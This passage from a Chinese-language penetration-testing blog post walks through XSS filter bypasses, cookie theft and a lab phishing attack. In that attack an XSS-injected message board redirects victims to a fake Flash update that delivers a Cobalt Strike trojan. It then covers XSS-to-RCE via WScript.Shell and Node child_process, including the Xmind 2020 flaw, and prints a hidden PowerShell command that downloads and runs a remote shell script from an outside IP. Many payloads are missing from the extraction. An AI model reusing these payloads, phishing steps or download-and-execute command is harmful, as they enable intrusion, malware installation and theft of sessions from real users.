    ......
看返回响应，是过滤的全部，还是只过滤了部分，是否还留下了 alert、prompt、confirm 等字符，再尝试大小写的组合：
（4）如果过滤器仅仅是把 `` 标签过滤掉，那么可以用双写的方式来绕过：
    ipt>alert(1)ipt>
这样当 `` 标签被过滤掉后，剩下的组合起来刚好形成一个完整的向量。
（5）用 `click
看看 `click
看是否返回错误，javascript的整个协议内容是否都被过滤掉，还是只过滤了javascript字符。
继续测试事件触发执行javascript：
    ClickHere
看onmouseover事件是否被过滤。
测试一个无效的事件，看看他的过滤规则：
    ClickHere
是完整的返回了呢，还是跟onmouseover一样被干掉了。如果是完整的返回的话，那么就意味着，做了事件的黑名单，但是在HTML5中，有超过150种的方式来执行javascript代码的事件，我们可以选用别的事件。测试一个很少见的事件：
    click
> onhashchange 事件在当前 URL 的锚部分(以 '#' 号为开始) 发生改变时触发 。
## 测试其他标签和属性
HTML的标签和属性太多了，上文中已经列出了很多了。
# XSS 攻击面拓展
## 利用 XSS 钓鱼
### 通过 XSS 盗取 Cookie
Cookie盗取是xss攻击中最实用也是最广泛的一种利用方式之一。我们知道Cookie是Web系统识别用户的身份和保存会话状态的主要机制，且是由服务器提供的、存储在客户端的一种数据。同时，对于cookie的操作十分的方便，我们可以通过Document对象访问Cookie。最简单的比如：``
，执行后会弹出当前页面的cookie信息。在目标没有“同源策略”的保护下，我们可以利用XSS盗取目标网站管理员的Cookie。
在一般的通用CMS下呢，为了通用模板的兼容性，许多CMS本身不会使用“同源策略”等其他手段来防护XSS漏洞，而是使用自建的过滤函数来处理，在这种情况下，一旦出现XSS漏洞，我们就可以直接获取目标的Cookie然后使用特定的方法来传输cookie。
这里，我们可以利用网上现成的或自己搭建的XSS平台来完成利用过程。
### Flash 弹窗钓鱼
之前看过很多大佬使用XSS漏洞弹出Flash的更新页面进行钓鱼的操作。今天我们终于有机会来演示一下了。
其原理就是通过XSS漏洞，弹出Flash更新请求诱使用户点击，使用户跳转到设置好的钓鱼页面（伪造好的Flash更新页面），下载伪造的Flash组件（木马程序）并执行，最终实现反弹Shell上线CS，完成钓鱼攻击。下面我们搭建环境进行演示。
**实验环境：**
主机环境：
  * 攻击机kali：192.168.0.182
  * 受害机：192.168.0.125
工具环境：
  * WeBug4.0
  * Flash 官网源码
**（1）制作 CS 捆绑木马**
这里我们选择制作WinRAR自解压捆绑木马，将 CS
木马与真正的Flash更新程序捆绑在一起，详情参考我的文章：[《钓鱼攻击：制作WinRAR自解压捆绑木马进行钓鱼攻击》](https://whoamianony.top/2021/01/27/渗透测试/钓鱼攻击/钓鱼攻击：利用WinRAR自解压捆木马进行钓鱼攻击/)
**（2）搭建Flash钓鱼页面**
首先我们需要在kali上搭建一个钓鱼页面，需要下载Flash官方页面的源码进行修改。这里有两个项目可以选择：
  * 项目一地址：
该项目是模仿的 Flash Player 中文官网的页面：
需要在index.html中的加入我们制作的木马的链接地址：
  * 项目二地址：
该项目是一个逼真的Flash更新提醒的弹窗，强迫症都会忍不住去点击下载的：
我们这里使用第二种方法，点击“立即升级”的这个按钮点击会下载我们提前准备好的 CS 木马。如果管理员以为自己的 Flash
版本过低的话，可能会下载并运行这个木马。
找到flash.js，搜索链接“
然后将伪造的Flash页面搭建在攻击机kali的Web服务上：
**（3）插入 XSS 攻击向量**
访问目标网站：
在最下方发现一个留言板：
经测试存在XSS漏洞，我们插入一下payload：
这样，当用户再次访问该页面或管理员在后台查看评论时，就会将页面劫持到我们所伪造的钓鱼页面上：
当受害者强迫症忍不住去点击“立即升级”时，就会下载我们所准备好的 CS 捆绑木马：
如果受害者以为自己的 Flash 版本过低的话，就可能会运行这个木马。如下图所示，受害者主机成功上线：
## XSS to RCE
为了大大提升 XSS 的危害，我们可以利用 JavaScript 来执行系统命令。
### 使用 WScript.Shell 执行系统命令
WScript.Shell（Windows Script Host Runtime
Library）是一个对象，对应的文件是C:/WINDOWS/system32/wshom.ocx，Wscript.shell是服务器系统会用到的一种组件。4这个对象可以执行操作系统外壳常用的操作，比如运行程序、读写注册表、环境变量等。简单使用如下：
    var shell = new ActiveXObject("WScript.Shell");
    shell.run("calc.exe");
有时候为了 Bypass 也可以使用 `String.fromCharCode` 从 Ascii 来转化恶意代码：
### 使用 child_process 执行系统命令
如果目标环境启用了 NodeJS 的话，我们也可以利用 NodeJS 的子进程（child_process）调用并执行系统命令：
    ');">
能执行系统命令了，那么 XSS 在钓鱼攻击中的作用便大大提高了，我们完全可以利用 XSS 反弹 Shell 并上线 Metasploit 或 CS
。请继续往下看。
### Xmind 2020 XSS 漏洞
XMind 是一款专业的全球领先的商业思维导图软件，在国内使用广泛，拥有强大的功能、包括思维管理、商务演示、与办公软件协同工作等功能。它采用全球先进的
Eclipse RCP 软件架构，是集思维导图与头脑风暴于一体的可视化思考工具，能用来捕捉想法、理清思路、管理复杂信息并促进团队协作。 XMind
思维导图软件曾被著名互联网媒体 Lifehacker 评选为“最佳头脑风暴和思维导图工具”及”最受欢迎的思维导图软件”。
2021年5月10日，被爆 Xmind 2020 中存在 XSS 漏洞，攻击者可以借助该漏洞实现命令执行，在实际环境中借助钓鱼攻击可能造成更严重的危害。
漏洞利用很简单，在 “思维导图” 中输出 Payload：
切换到 “大纲” 中，按下一个功能键即可触发攻击：
由于 Xmind 启用了 NodeJS 功能，所以我们可以利用 child_process 调用并执行系统命令。这和蚁剑的 XSS 导致 RCE
原理如出一辙：
同时我们可以利用这一点进行钓鱼，让受害机上线 Metasploit 或 CS。
首先使用 CS 生成钓鱼使用的 PowerShell 脚本：
点击 Launch 后生成攻击命令：
    powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://47.101.57.72:8088/shell'))"
即：
    require('child_process').exec('powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring(\'http://47.101.57.72:8088/shell\'))"');
为了更好地 Bypass，我们可以将 payload 进行 base64 转化一下，最终的 Payload 如下：
如下图所示，受害机成功上线：
> 参考：
>
> 
>
> 
>
> 
>
> 
>
> 
>
> 
>
> 
>
> [https://wooyun.js.org/drops/Bypass
> xss过滤的测试方法](https://wooyun.js.org/drops/Bypass%20xss%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95.html)
>
>
> [https://www.0x002.com/2019/前端Hack之XSS攻击个人学习笔记/](https://www.0x002.com/2019/%E5%89%8D%E7%AB%AFHack%E4%B9%8BXSS%E6%94%BB%E5%87%BB%E4%B8%AA%E4%BA%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/)
>
>
> [http://next.uuzdaisuki.com/2018/04/24/XSS绕过和利用方式总结/](http://next.uuzdaisuki.com/2018/04/24/XSS%E7%BB%95%E8%BF%87%E5%92%8C%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/)